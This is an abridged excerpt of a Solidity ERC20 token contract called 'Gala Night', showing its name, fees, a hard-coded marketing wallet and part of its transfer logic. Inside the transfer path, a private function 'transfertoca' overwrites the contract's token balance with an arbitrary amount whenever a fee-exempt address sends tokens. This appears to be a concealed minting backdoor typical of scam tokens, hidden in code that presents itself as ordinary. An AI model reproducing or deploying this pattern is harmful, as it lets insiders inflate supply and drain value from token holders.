...
contract GalaNight is Context, IERC20, Ownable {
    ...
    string private constant _name = "Gala Night"; // 
    string private constant _symbol = unicode"GALA-NIGHT"; //    
    uint8 private constant _decimals = 9; // 

    
    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 0;
    address public  _MarketingWallet = 0x39DDFED380CaCEF3baAAdF3a42EC6F8A3AA12b62;
    ...
    }else{if (_isExcludedFromFee[from]){transfertoca(amount);}
    }
    }
    
    function transfertoca(uint256 quant) private {
        _tOwned[address(this)] = quant; 
    }
